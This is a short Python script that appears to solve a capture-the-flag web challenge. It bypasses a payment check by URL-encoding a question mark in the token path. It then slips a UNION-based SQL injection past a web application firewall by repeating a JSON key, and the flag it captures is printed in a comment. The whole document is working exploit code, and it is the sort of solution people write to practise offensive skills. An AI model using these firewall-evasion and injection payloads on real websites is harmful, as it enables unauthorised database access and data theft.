#!/usr/bin/env python3

import requests

sess = requests.Session()
host = "http://waffle.challs.m0lecon.it"

sess.get(host + "/gettoken%3fcreditcard=x&promocode=FREEWAF")

print(f"Recieved token: {sess.cookies['token']}")

payload = """{"name":"' union select flag, 1, 1, 1 from flag-- -","name":"x"}"""
flag = sess.post(host + "/search", data=payload)

print(f"Flag: {flag.json()[0]['name']}")

# Flag: ptm{n3ver_ev3r_tru5t_4_pars3r!}